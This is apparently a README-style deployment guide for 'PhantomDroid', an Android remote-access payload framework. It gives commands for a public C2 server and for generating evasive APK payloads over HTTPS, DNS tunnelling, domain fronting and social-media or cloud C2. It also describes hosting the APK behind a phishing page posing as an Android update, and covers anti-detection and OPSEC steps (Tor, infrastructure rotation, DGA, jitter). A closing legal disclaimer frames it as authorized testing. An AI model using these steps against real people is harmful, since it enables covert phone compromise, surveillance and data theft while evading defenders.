# PhantomDroid Public Network Deployment Guide

```
 ██████╗██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
           M DHARAN RAJ - WEB DEVELOPER & ETHICAL HACKER
```

## 🌐 Public Network Deployment Guide

**⚠️ LEGAL WARNING: This guide is for authorized penetration testing ONLY. Ensure you have proper written authorization before testing on any network.**

## 📋 Complete Dependencies List

### **System Requirements**
```bash
# Operating System
- Linux (Ubuntu 20.04+, Kali Linux 2023.1+, Parrot OS 5.0+)
- Windows 10/11 with WSL2 (for development)
- macOS 12+ (limited support)

# Hardware Requirements
- RAM: 4GB minimum, 8GB recommended
- Storage: 10GB free space
- Network: Stable internet connection
- CPU: x64 architecture
```

### **Core Dependencies**
```bash
# Python Environment
python3 (3.8+)
python3-pip
python3-venv
python3-dev

# Java Development Kit
openjdk-11-jdk
openjdk-11-jre

# Android Development Tools
android-sdk
android-sdk-build-tools
android-sdk-platform-tools
aapt
aapt2
zipalign
apksigner

# APK Manipulation Tools
apktool
dex2jar
jadx
baksmali
smali

# Network Tools
netcat-openbsd
nmap
masscan
curl
wget
socat

# Reverse Engineering
radare2
ghidra
objdump
strings
hexdump

# Cryptography Tools
openssl
gpg
```

### **Python Dependencies**
```bash
# Core Framework
flask>=2.3.0
requests>=2.31.0
cryptography>=41.0.0
pycryptodome>=3.18.0

# Web Interface
jinja2>=3.1.0
werkzeug>=2.3.0
gunicorn>=21.2.0

# APK Processing
lxml>=4.9.0
beautifulsoup4>=4.12.0
pillow>=10.0.0

# Network Operations
scapy>=2.5.0
dnspython>=2.4.0
paramiko>=3.3.0

# Database
sqlite3 (built-in)
sqlalchemy>=2.0.0

# Utilities
colorama>=0.4.6
tqdm>=4.66.0
psutil>=5.9.0
```

### **Optional Dependencies**
```bash
# Metasploit Framework
metasploit-framework
msfvenom
msfconsole

# Social Engineering
set (Social Engineering Toolkit)

# Traffic Analysis
wireshark
tcpdump
tshark

# VPN/Proxy
openvpn
tor
proxychains4

# Cloud Services
aws-cli
gcloud
azure-cli
```

## 🚀 Public Network Deployment Steps

### **Step 1: Infrastructure Setup**

#### **1.1 VPS/Cloud Server Setup**
```bash
# Recommended VPS providers for testing
- DigitalOcean (Droplet)
- AWS EC2
- Google Cloud Compute
- Vultr
- Linode

# Server specifications
- OS: Ubuntu 22.04 LTS
- RAM: 4GB minimum
- Storage: 25GB SSD
- Network: 1Gbps
```

#### **1.2 Domain and DNS Setup**
```bash
# Register a domain for C2 communication
# Example: yourdomain.com

# Set up DNS records
A record: c2.yourdomain.com -> YOUR_VPS_IP
A record: api.yourdomain.com -> YOUR_VPS_IP
CNAME: www.yourdomain.com -> yourdomain.com

# Verify DNS propagation
dig c2.yourdomain.com
nslookup api.yourdomain.com
```

#### **1.3 SSL Certificate Setup**
```bash
# Install Let's Encrypt
sudo apt update
sudo apt install certbot python3-certbot-nginx

# Generate SSL certificates
sudo certbot certonly --standalone -d yourdomain.com -d c2.yourdomain.com -d api.yourdomain.com

# Verify certificates
sudo certbot certificates
```

### **Step 2: PhantomDroid Installation on VPS**

```bash
# Connect to your VPS
ssh root@YOUR_VPS_IP

# Update system
sudo apt update && sudo apt upgrade -y

# Clone PhantomDroid
git clone https://github.com/your-repo/PhantomDroid.git
cd PhantomDroid

# Run installer
chmod +x install.sh
sudo ./install.sh

# Install additional dependencies
sudo apt install nginx ufw fail2ban -y
```

### **Step 3: Network Configuration**

#### **3.1 Firewall Setup**
```bash
# Configure UFW firewall
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow ssh
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw allow 8080/tcp  # Web interface
sudo ufw allow 4444/tcp  # Payload listener
sudo ufw enable

# Check firewall status
sudo ufw status verbose
```

#### **3.2 Nginx Reverse Proxy**
```bash
# Create Nginx configuration
sudo nano /etc/nginx/sites-available/phantomdroid

# Add configuration:
server {
    listen 80;
    server_name yourdomain.com c2.yourdomain.com;
    return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl;
    server_name c2.yourdomain.com;
    
    ssl_certificate /etc/letsencrypt/live/yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/yourdomain.com/privkey.pem;
    
    location / {
        proxy_pass http://127.0.0.1:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}

# Enable site
sudo ln -s /etc/nginx/sites-available/phantomdroid /etc/nginx/sites-enabled/
sudo nginx -t
sudo systemctl restart nginx
```

### **Step 4: Public Network Payload Generation**

#### **4.1 Generate Public Network Payload**
```bash
# Generate HTTPS payload for public network
./phantomdroid.sh --payload http --lhost c2.yourdomain.com --lport 443 --evasion extreme --ssl

# Generate DNS tunneling payload (more stealthy)
./phantomdroid.sh --payload dns --lhost yourdomain.com --lport 53 --evasion extreme

# Generate multi-stage payload
./phantomdroid.sh --payload tcp --lhost c2.yourdomain.com --lport 4444 --evasion extreme --multi-stage
```

#### **4.2 Advanced Payload Options**
```bash
# Domain fronting payload (using CDN)
./phantomdroid.sh --payload http --lhost cloudfront.amazonaws.com --domain-front c2.yourdomain.com --lport 443

# Social media C2 (Twitter/Telegram)
./phantomdroid.sh --payload social --platform twitter --api-key YOUR_API_KEY

# Cloud storage C2 (Dropbox/Google Drive)
./phantomdroid.sh --payload cloud --provider dropbox --token YOUR_TOKEN
```

### **Step 5: C2 Server Deployment**

#### **5.1 Start C2 Server**
```bash
# Start C2 server with SSL
python3 core/c2_server.py --host 0.0.0.0 --port 8080 --ssl --cert /etc/letsencrypt/live/yourdomain.com/fullchain.pem --key /etc/letsencrypt/live/yourdomain.com/privkey.pem

# Start in background with screen
screen -S phantomdroid-c2
python3 core/c2_server.py --host 0.0.0.0 --port 8080 --ssl
# Press Ctrl+A, then D to detach

# Start with systemd service
sudo nano /etc/systemd/system/phantomdroid.service
```

#### **5.2 Systemd Service Configuration**
```bash
[Unit]
Description=PhantomDroid C2 Server
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root/PhantomDroid
ExecStart=/usr/bin/python3 core/c2_server.py --host 0.0.0.0 --port 8080 --ssl
Restart=always

[Install]
WantedBy=multi-user.target

# Enable and start service
sudo systemctl enable phantomdroid
sudo systemctl start phantomdroid
sudo systemctl status phantomdroid
```

### **Step 6: Payload Deployment**

#### **6.1 Web-based Deployment**
```bash
# Access web interface
https://c2.yourdomain.com

# Upload payload to web server
scp output/phantom_http_*.apk root@YOUR_VPS_IP:/var/www/html/

# Create download link
https://yourdomain.com/phantom_http_20250810_110000.apk
```

#### **6.2 Social Engineering Deployment**
```bash
# Generate phishing page
./phantomdroid.sh --social-eng --template android-update --payload phantom_http_*.apk

# Host phishing page
cp social_eng/android_update.html /var/www/html/update.html

# Send phishing link
https://yourdomain.com/update.html
```

### **Step 7: Traffic Obfuscation**

#### **7.1 Domain Fronting Setup**
```bash
# Use CDN for traffic hiding
# CloudFlare setup
curl -X POST "https://api.cloudflare.com/client/v4/zones" \
  -H "Authorization: Bearer YOUR_API_TOKEN" \
  -H "Content-Type: application/json" \
  --data '{"name":"yourdomain.com"}'

# Configure domain fronting in payload
./phantomdroid.sh --payload http --domain-front cloudflare.com --real-host c2.yourdomain.com
```

#### **7.2 Traffic Encryption**
```bash
# Generate custom encryption keys
openssl genrsa -out private.key 2048
openssl rsa -in private.key -pubout -out public.key

# Use custom encryption in payload
./phantomdroid.sh --payload http --lhost c2.yourdomain.com --encrypt-key public.key
```

### **Step 8: Monitoring and Logging**

#### **8.1 Server Monitoring**
```bash
# Monitor C2 connections
tail -f logs/c2_server.log

# Monitor system resources
htop
iotop
nethogs

# Monitor network connections
netstat -tulnp | grep :8080
ss -tulnp | grep :4444
```

#### **8.2 Log Management**
```bash
# Rotate logs
sudo nano /etc/logrotate.d/phantomdroid

/root/PhantomDroid/logs/*.log {
    daily
    rotate 30
    compress
    delaycompress
    missingok
    notifempty
    create 644 root root
}

# Clean old logs
find logs/ -name "*.log" -mtime +30 -delete
```

### **Step 9: Security Considerations**

#### **9.1 OPSEC (Operational Security)**
```bash
# Use VPN for all connections
openvpn --config your-vpn.ovpn

# Use Tor for additional anonymity
proxychains4 ./phantomdroid.sh

# Rotate infrastructure regularly
# Change domains every 30 days
# Rotate VPS every 60 days
```

#### **9.2 Anti-Detection**
```bash
# Randomize C2 communication intervals
./phantomdroid.sh --jitter 30-300 --sleep 60-600

# Use legitimate-looking domains
# Examples: update-service.com, security-check.net

# Implement domain generation algorithm (DGA)
./phantomdroid.sh --dga --seed $(date +%Y%m%d)
```

## 🔧 Troubleshooting Public Network Issues

### **Common Problems and Solutions**

#### **Connection Issues**
```bash
# Test connectivity
curl -I https://c2.yourdomain.com
telnet c2.yourdomain.com 443

# Check DNS resolution
dig c2.yourdomain.com
nslookup c2.yourdomain.com 8.8.8.8

# Verify SSL certificate
openssl s_client -connect c2.yourdomain.com:443
```

#### **Firewall Issues**
```bash
# Check if ports are blocked
nmap -p 80,443,4444,8080 c2.yourdomain.com

# Test from different networks
# Use mobile hotspot, different ISP, VPN
```

#### **Payload Not Connecting**
```bash
# Check payload configuration
strings output/phantom_*.apk | grep -E "(http|tcp|dns)"

# Verify C2 server is running
ps aux | grep c2_server
netstat -tulnp | grep python3

# Check logs for errors
tail -f logs/phantomdroid.log
tail -f logs/c2_server.log
```

## 📊 Performance Optimization

### **Server Optimization**
```bash
# Increase file descriptors
echo "* soft nofile 65536" >> /etc/security/limits.conf
echo "* hard nofile 65536" >> /etc/security/limits.conf

# Optimize TCP settings
echo "net.core.somaxconn = 65536" >> /etc/sysctl.conf
echo "net.ipv4.tcp_max_syn_backlog = 65536" >> /etc/sysctl.conf
sysctl -p
```

### **Database Optimization**
```bash
# Optimize SQLite for high concurrency
sqlite3 phantomdroid.db "PRAGMA journal_mode=WAL;"
sqlite3 phantomdroid.db "PRAGMA synchronous=NORMAL;"
sqlite3 phantomdroid.db "PRAGMA cache_size=10000;"
```

## ⚠️ Legal and Ethical Guidelines

### **Before Deployment**
1. **Written Authorization**: Obtain explicit written permission
2. **Scope Definition**: Clearly define testing boundaries
3. **Legal Review**: Consult with legal team
4. **Insurance**: Ensure proper liability coverage
5. **Compliance**: Follow local laws and regulations

### **During Testing**
1. **Minimize Impact**: Avoid disrupting normal operations
2. **Data Protection**: Don't access sensitive data
3. **Documentation**: Keep detailed logs of all activities
4. **Communication**: Maintain contact with client
5. **Incident Response**: Have plan for unexpected issues

### **After Testing**
1. **Cleanup**: Remove all payloads and backdoors
2. **Reporting**: Provide comprehensive security report
3. **Data Destruction**: Securely delete all collected data
4. **Follow-up**: Assist with remediation efforts
5. **Disclosure**: Follow responsible disclosure practices

---

**Created by: M DHARAN RAJ - Web Developer & Ethical Hacker**

**Remember**: This framework is for authorized security testing only. Always follow ethical hacking principles and legal requirements.
